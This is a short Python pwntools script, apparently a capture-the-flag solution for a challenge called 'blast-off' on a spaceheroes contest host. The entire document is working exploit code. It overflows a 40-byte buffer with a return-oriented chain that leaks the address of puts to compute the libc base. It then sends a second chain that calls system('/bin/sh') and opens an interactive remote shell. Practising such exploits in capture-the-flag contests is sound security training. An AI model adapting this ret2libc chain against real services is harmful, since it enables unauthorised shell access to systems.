from pwn import * 
io = remote("spaceheroes-blast-off.chals.io", 443, ssl=True, sni="spaceheroes-blast-off.chals.io")
libc = ELF("./libc6_2.27-3ubuntu1.5_amd64.so")

io.recvuntil("PUTS_PLT ")
putsPlt = int(io.recv(8),16)
io.recvuntil("BROP_GADGET ")
bropGadget = int(io.recv(8),16) 
io.recvuntil("BLAST_OFF GOT ")
blastOffGot = int(io.recv(8),16)
io.recvuntil("MAIN ")
main = int(io.recv(8),16)

popRdi = bropGadget + 9
ret = bropGadget + 10
putsGot = blastOffGot - 8*4

exploit = b"A" * 40 + p64(popRdi) + p64(putsGot) + p64(putsPlt) + p64(main)
io.sendlineafter("Please enter the launch codes to start: ",exploit)
io.recvline()
putsLibc = u64(io.recvline()[:-1].ljust(8,b"\x00"))
log.info("puts libc: " + hex(putsLibc))
libc.address = putsLibc - libc.symbols["puts"]

exploit = b"A" * 40 + p64(ret) + p64(popRdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])
io.sendlineafter("Please enter the launch codes to start: ",exploit)

io.interactive()
